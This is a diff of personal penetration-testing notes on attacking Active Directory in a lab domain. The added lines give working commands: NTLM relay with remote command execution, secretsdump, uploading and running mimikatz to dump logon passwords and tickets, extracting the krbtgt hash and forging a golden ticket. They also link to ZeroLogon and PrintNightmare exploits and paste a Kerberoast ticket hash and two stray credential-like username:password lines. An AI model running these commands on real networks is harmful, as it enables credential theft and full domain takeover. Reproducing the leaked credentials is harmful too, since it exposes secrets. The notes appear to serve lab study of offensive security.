@@ -109,6 +109,10 @@ nc 127.0.0.1 11000
 ```
 ![[Pasted image 20250429220425.png]]
 which will open a prompt to control the machine.
+You can also add the -c tag to execute commands on the machine like this
+```
+sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c <command>
+```
 
 ## Shell Access 
 *This works once you have gained either a password or a hash*
@@ -168,7 +172,8 @@ To run the secrets-dump script use
 impacket-secretsdump <Domain>/<DU-User>:'<DU-Pass>'@<DC-IP>
 ```
 ![[Pasted image 20250430115017.png]]
-
+qKaDjJwNBv:9lg1PhKV4Prk{m3 
+MeVInaZbgo:(E1kbB@j7#->qh( 
 ## Passback Attack
 *Old, but may still work*
 
@@ -295,8 +300,13 @@ HYDRA-DC/SQLService.MARVEL.local:60111          sqlservice  CN=Group Policy Crea
 
 
 [-] CCache file is not found. Skipping...
-$krb5tgs$23$*sqlservice$MARVEL.LOCAL$MARVEL.local/sqlservice*$ff872d1684e55d234a0c128e60b3348d$7da0166cf6f40afe288b62d82923586bac1e6bc20746266e21233171181958dbbadc3515dc527b32100b78899d90f53d2e93575ff78948c4365d3e190a0417072e1d22ef1b7ae03f23d7bf780a6c9fddebc75d334947306e6e5af6558b06d963b463201d508cbad8287db5974f771ea1658fa9c684f7d592671902780bf9e2c1b9ca6c32248bcf2d5a3f5e8095ac64c7c38b9a7d1a370d6421502192b4f686a14407b264a75730360ad02b25c9484d48bb4e1e7418ed5e003ecad3abef2deabd2ae503f92c508110d4a592ca3e134968e1b1f973683495770e1739003bbabe1815ff4bab276ce642f8c2e50afb5cf2329ca2cbc5a85d2af7085908c2f1ebac7fe293c27cf5005e9fb0ba0a2cb9fe77a2b07bf61834d57f65691f0ac3a3db3206626a69882168cda20b795a0f472d5ef231f187ced50951b17292edadc022f9a4d0708e91bc4e4013cd7304b7a2c3931bf147b97cc0cef4741d3a3af9967301d3772fbe123a7a2b0377de9918d6f51e50450f5d4c26fa74c61b2b9f84555b6f995edfd951a0afa7448f087bd3b73495951e42ed525d3bce88e1cc4a30209d53eec4edd49070a632238fbbe408bb7ba12b4bd05f61c025af5304075a8b71d9d1a30c8069f63250eeb1c71f89c741c7feb8cd109dc1fa57fa7fa5481803e3ca3ed9d8e3855815f3bf27fa153b943138e172c31ef5a5fa54f397b1a922c8922278b7fadf0d870a9ad25ce888de79ecf6ac1f379b11ebbd025ed6dd375f272b182b538404fe515d1749f0b4f5cd720865d7b57eed92009ad95839102760b1c55215c7b97955329934036ee9893634d9697afac654c6dad9dd25b76eb6827367c75bf68e6bb94d832b3ce71cf45cdaffd32f6a7a74bb02e9b1465303c9818e4405f4b0b42e99a87a3ba04eed94bf199c0753eb365375741ba9988e66b93446841f1d3d27d82268d14ab4b19ce21b40506f2d3361af4a27cae6d6804e56924c0bec2e89bc6ef40537bdb69f1c50a352cdb364d3fd705640a58a12c8479bf17bec3f74a052333d472f973e3e01def5f7637c7890c47c5facd72adfd157a5e2e3baede42f4edad639294dd882240173b1d5662370872edc7a1f283923481642a6acdf99158496a8f8ddcbb4d2c54b8e35643e46327cfc2fad26b9502d465e83414532860a2a51387c94abd44d8e2e68f99b24835ecca07d2b31ed79d38d8fb05320519385281a30db1183a05c950faf99d7ba57df31af8f86a4f20eb5da44bd7c57e9d7ac67062a57bd1bb762a5533d43f62da88367d50af77b37d26c4109fc8e422332f30c3d9d93bb17a5bffba23375435ecdadcb0b6b4242a3133a1faefce020edc36e4dbc1fa7a3273d69ce04534f694ef1e0d34aeebfa012305289f3983a57c420f3db5268ae7f46278a4e92a4f4302bf3213f31ce1543f85ad6b0541132985c38346ce9bba844b948f802e7db8b6aa6f7889ea7b03f6fa10c7532ae741b7f901191f4a0b3dbdc965ce352ee7719aea2f9f462a6d92d
+$krb5tgs$23$*sqlservice$MARVEL.LOCAL$MARVEL.local/sqlservice*$e3f9f3a5bdc0ced4959790704f89b81a$84d8cd5611e64399beee3a5346a24ea1849a3cda6ea1eff623ffe6971ba06bbe06c0bbc67c61b22b386fde03ab975a40630108ef155f4c7ec25d67e8c7228c2806f21986f5226dbf21c8190b45156654c1315ed06baaba0b1b9c5beda7aa8cacd25e466d223b883944b62a871feae4ff765bfaa91a879de05d45995ad2924ad19bceb005da6ba27cde6b93c4fcd4884b71e4d6d522422aa2808502d1524f29d736cb0d16ec28d53f57c062ef2a0b9fcc691069341e335a36c36bcc36b0abdedfa0a275b1ee5a90008d273a64160e95a2494af8cbcc3b2694b547ac4aa881fb53610691b370d6664a8d9c7546eaaa4d5e7034a5b2a9612ab196a86e249802412f27bc48b32d3fe58bdfa548882aa7f754050def0782c5f021d8223b7d4d29cc1f8c34772aabb4f36996de230f5f4b23e5e4640a8bcb91b51d72084ee86ad5817da77704e2174a0b92f5b22f71ba6ec007d6d9830ed0ea59a45f4e1c2dd2cabe56c96729dd422f416cbd67b31ed81dc714f22c0c865da6db672950fd9db9a3a07523ec98048bb27d6dfb73d65051976a5734c8362b2438e9e55514b2071ae6c84a98c1998571191ca25d59f73af52ded477264d7b1a26bd50b29f8749f41254479fbcef6e89cd9802873ec40f86c639ca723944771140b1e674cc0d343866ee865ce844b771484187b1832de1aa6b877107d1184dccfec0a2a4f436ab4186a077ba6cbc5857c827179bdb224d9a98cd913bc13519c3d3bcab2f92e8405677d616d28d83701dc78e3963750bb29af77468248c54ab41ac8b0e13d06a18e495b6c0942f54b01d4d52e4c09ac8b73e984fc13091dfd59fda2ffe04a688336a85cc8f7b1f7307bb8929fc0db80901a25fdb678a7af2e7ac6829b60d78777d8da179bcee62c7f1abadc20c27535276ff44e5d411f9ef842a5d086ec96fd2161a46689e8db8df590627f80ebdecdf417067f43c9e1b08574b5c682b27c1eb3a0336a908cbdc8dd04db5abcddae9224ef8dcc29542ec63761a9f236ad56a73aeb186a70b2764590950bf9d94f8d4d56b03b3730f07473a32410d1d21dc953e88443acf02207e1541ddcdf376bc36e08f2c205d94285121f39739bb59c5a3e8db0ca570c1ea50211151f279a2adc793bd7b29772ddff7798fa9c5817263b6f5d06a25d9581538a83549ebf83d943a6b5ede2c2f57deebaa4e64c731d5c898ecb92fe2ff32267f59380c4c62f4ce59da08273391b85b231b77b9a22c812d5aafef813d60cef26bbf111e4890017df849709810d3edcdc5e04e7c28adc64b9ee880f8b51348413e56b83e75c2c918752f2b2ac822b2f14255f5e9ce37537e10cdbb03f53ff93c60200423ebba81da228ca2fc227758cedad2f05ebfb6414326af35c78fe0c44c134dec23070c83c0e310332947f04e2fdf16f05fd2247ca5b1da9697fdd32de244cb9010122535b360e34e9fce5c219df3e8f312abbf69f92c56b8a0b1e69a568b486b53b66e80641bf1990966ec6e5226ada2c
 ```
+To fix clock skew
+```
+sudo ntpdate -du <DC IP>
+```
+
 
 ## Token Impersonation
 *Who needs using incognito mode on your computer when you can use it on a friends?*
@@ -367,9 +377,33 @@ This will sometimes find user:pass pairs stored on old GPP
 In Metasploit use smb_enum_gpp
 
 ## Mimikatz
+To start, just download the file onto the compromised windows host
+On Kali you can upload it from Meterpreter with this command
+```
+upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+```
+Then run it
+```
+mimikatz.exe
+```
+Some things to try
+```
+privilege::
+sekurlsa::logonpasswords
+sekurlsa::tickets
+sekurlsa::tickets /export
+```
+Get SID
+```
+(Get-ADDomain).DomainSID.Value
+```
+S-1-5-21-1658060322-2034742339-247117061
 
 # POST-DOMAIN COMPROMISE 
-## NTDS.dit
+*What to do now?*
+1. Total control
+2. Do it again, provide more value
+### NTDS.dit
 *This is a AD database for user, group & password hashes*
 Run the secretsdump script on the DC 
 *Note: Excel can efficiently separate nt:lm and usernames from the hashlist*
@@ -377,17 +411,32 @@ Run the secretsdump script on the DC
 ```
 hashcat -m 1000 <hashes.txt> <wordlist>
 ```
-## Golden Ticket
+### Golden Ticket
 *Who wants access to a chocolate factory when you can control any machine on the domain*
 You need these to generate a golden ticket
 	1. SID
 	2. krbtgt hash
+Start by running mimikatz
+```
+privilege:debug
+lsadump::lsa /inject /name:krbtgt
+```
+![[Pasted image 20250506150842.png]]
+```
+kerberos::golden /User:<User> /domain:<domain> /sid:<SID> /krbtgt:<krbtgt> /id:500 /ptt
+```
+If in desktop, you can start a shell from mimikatz
+```
+misc::cmd
+```
+
 ### ZeroLogon
 *Probably don't run it, just scan for it*
+[Here](https://github.com/SecuraBV/CVE-2020-1472) is the scanner for ZeroLogon
+[Here](https://github.com/dirkjanm/CVE-2020-1472) is the exploit
+If you do run this, **make sure to change the password back, otherwise it will stay broken**
 
 ### PrintNightmare
 *Probably don't run it, just scan for it*
-
-
-
-
+[CVE](https://github.com/cube0x0/CVE-2021-1675) Information
+[Exploit](https://github.com/calebstewart/CVE-2021-1675) Information
